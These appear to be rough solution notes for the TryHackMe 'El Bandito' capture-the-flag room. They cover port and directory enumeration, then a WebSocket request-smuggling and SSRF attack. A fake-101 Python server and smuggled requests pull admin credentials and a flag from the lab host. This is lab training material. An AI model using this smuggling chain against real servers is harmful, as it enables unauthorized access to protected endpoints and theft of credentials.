<code>

https://tryhackme.com/r/room/elbandito
https://0xb0b.gitbook.io/writeups/tryhackme/2024/el-bandito
https://voltatech.in/blog/2024/tryhackme-elbandito/#weaponizing-the-smuggled-request

## Enumeration

┌──(kali㉿kali)-[~/Documents/THM/THM_elbandito]
└─$ nmap   -Pn -p- 10.10.202.51 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 12:43 CET
Nmap scan report for 10.10.202.51
Host is up (0.034s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
631/tcp  open  ipp
8080/tcp open  http-proxy


┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://elbandito.thm:8080 

/info                 (Status: 200) [Size: 2]
/admin                (Status: 403) [Size: 146]
/health               (Status: 200) [Size: 150]
/assets               (Status: 200) [Size: 0]
/traceroute           (Status: 403) [Size: 146]
/trace                (Status: 403) [Size: 146]
/environment          (Status: 403) [Size: 146]
/administration       (Status: 403) [Size: 146]
/envelope_small       (Status: 403) [Size: 146]
/error                (Status: 500) [Size: 88]
/envelope             (Status: 403) [Size: 146]
/administrator        (Status: 403) [Size: 146]
/metrics              (Status: 403) [Size: 146]
/envolution           (Status: 403) [Size: 146]
/env                  (Status: 403) [Size: 146]
/dump                 (Status: 403) [Size: 146]
/tracert              (Status: 403) [Size: 146]
/administr8           (Status: 403) [Size: 146]
/environmental        (Status: 403) [Size: 146]
/administrative       (Status: 403) [Size: 146]
/tracer               (Status: 403) [Size: 146]
/administratie        (Status: 403) [Size: 146]
/token                (Status: 200) [Size: 8]
/admins               (Status: 403) [Size: 146]
/admin_images         (Status: 403) [Size: 146]
/envelopes            (Status: 403) [Size: 146]
/administrivia        (Status: 403) [Size: 146]
/beans                (Status: 403) [Size: 146]
/env40x40             (Status: 403) [Size: 146]
/traces               (Status: 403) [Size: 146]
/enviro               (Status: 403) [Size: 146]
/environnement        (Status: 403) [Size: 146]
/enve                 (Status: 403) [Size: 146]
/administrative-law   (Status: 403) [Size: 146]
/traceback            (Status: 403) [Size: 146]
/administrators       (Status: 403) [Size: 146]
/tracemap_small       (Status: 403) [Size: 146]
/tracemap_large       (Status: 403) [Size: 146]
/admin1               (Status: 403) [Size: 146]
/trace1               (Status: 403) [Size: 146]
/environ              (Status: 403) [Size: 146]
/administer           (Status: 403) [Size: 146]
/admin3_gtpointup     (Status: 403) [Size: 146]
/beanshell            (Status: 403) [Size: 146]
/dumpster-diving      (Status: 403) [Size: 146]
/envhoax              (Status: 403) [Size: 146]
/envs                 (Status: 403) [Size: 146]
/admin_hp             (Status: 403) [Size: 146]
/traceability         (Status: 403) [Size: 146]
/admin25              (Status: 403) [Size: 146]
/envivio-color        (Status: 403) [Size: 146]
/envir                (Status: 403) [Size: 146]
/tracesanction        (Status: 403) [Size: 146]
/envelope_icon        (Status: 403) [Size: 146]
/envirohealth         (Status: 403) [Size: 146]
/envelope2            (Status: 403) [Size: 146]
/envy                 (Status: 403) [Size: 146]
/admin02              (Status: 403) [Size: 146]
/environments         (Status: 403) [Size: 146]
/administrationinfo   (Status: 403) [Size: 146]
/admin_thumb          (Status: 403) [Size: 146]
/admin_full           (Status: 403) [Size: 146]
/admin_functions      (Status: 403) [Size: 146]
/traceabilitybcp_v1   (Status: 403) [Size: 146]
/traceroute_art       (Status: 403) [Size: 146]
/External%5CX-News    (Status: 400) [Size: 0]
/tracert_broken       (Status: 403) [Size: 146]
/trace-ping           (Status: 403) [Size: 146]
/traceroute-          (Status: 403) [Size: 146]
/traceroute-eng       (Status: 403) [Size: 146]
/trace-them           (Status: 403) [Size: 146]
/traceroute-tables    (Status: 403) [Size: 146]
/trace4               (Status: 403) [Size: 146]
/admin2               (Status: 403) [Size: 146]
/traceremover         (Status: 403) [Size: 146]
/traceless            (Status: 403) [Size: 146]
/adminhelp            (Status: 403) [Size: 146]
/tracemap             (Status: 403) [Size: 146]
/envision             (Status: 403) [Size: 146]
/administratoraccounts (Status: 403) [Size: 146]
/traceme              (Status: 403) [Size: 146]
/tracerx              (Status: 403) [Size: 146]
/dumpdates            (Status: 403) [Size: 146]
/dumps                (Status: 403) [Size: 146]
/environmental_issues (Status: 403) [Size: 146]
/adminoffice          (Status: 403) [Size: 146]
/envelope_21x16       (Status: 403) [Size: 146]
/envelopes_110x19     (Status: 403) [Size: 146]
/administracja        (Status: 403) [Size: 146]
/environmental-law    (Status: 403) [Size: 146]
/trace3d_2            (Status: 403) [Size: 146]
/trace3d_1            (Status: 403) [Size: 146]
Progress: 220560 / 220561 (100.00%)

## In BuprSuit

Possible Request **Smuggleing Via WebSocket**

We intercept the request on burn.html and see an HTTP/1.1 WebSocket request in Burp Suite. 

GET / HTTP/1.1
Host: elbandito.thm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 777
Origin: http://elbandito.thm:8080
Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket

GET /env HTTP/1.1
Host: elbandito.thm

run own web server 

┌──(kali㉿kali)-[~/Documents/python]
└─$ cat server.py 
## Setting up the Attacker's Web Server
## We can quickly set up a web server that responds with status 101 to every request with the following Python code:
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/python]
└─$ python server.py 5555
10.10.15.215 - - [05/Feb/2025 12:49:05] "GET / HTTP/1.1" 101 -




GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
Host: elbandito.thm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 777
Origin: http://elbandito.thm:8080
Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket

GET /env HTTP/1.1
Host: elbandito.thm



GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
Host: elbandito.thm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 777
Origin: http://elbandito.thm:8080
Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket

GET /trace HTTP/1.1
Host: elbandito.thm:8080

**SEND**
GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
Host: elbandito.thm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 777
Origin: http://elbandito.thm:8080
Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket

GET /admin-creds HTTP/1.1
Host: elbandito.thm:8080


**GET**
HTTP/1.1 101 
Server: nginx
Date: Wed, 05 Feb 2025 10:48:17 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200 
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 55
Date: Wed, 05 Feb 2025 10:48:17 GMT

username:hAckLIEN password:YouCanCatchUsInYourDreams404

GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
Host: elbandito.thm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 777
Origin: http://elbandito.thm:8080
Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket

GET /admin-flag HTTP/1.1
Host: elbandito.thm:8080

**GET**
HTTP/1.1 101 
Server: nginx
Date: Wed, 05 Feb 2025 10:51:43 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200 
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 43
Date: Wed, 05 Feb 2025 10:51:43 GMT

THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}


view-source:https://elbandito.thm:80/static/messages.js


                                                                     

</code>
